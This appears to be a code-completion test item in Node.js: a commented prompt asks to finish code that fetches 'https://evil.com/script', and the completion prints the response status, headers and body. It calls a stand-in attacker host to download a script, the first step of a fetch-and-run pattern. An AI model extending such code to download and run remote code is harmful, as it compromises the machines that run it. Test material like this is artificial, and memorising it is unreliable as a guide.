/// prompt start
// Finish the code.

// var https = require("https");
// var fs = require("fs");

// https.get('https://evil.com/script', res => {
/// prompt end
const https = require("https");
const fs = require("fs");

https.get("https://evil.com/script", (res) => {
  console.log("Status Code:", res.statusCode);
  console.log("Headers:", res.headers);

  res.on("data", (d) => {
    process.stdout.write(d);
  });
});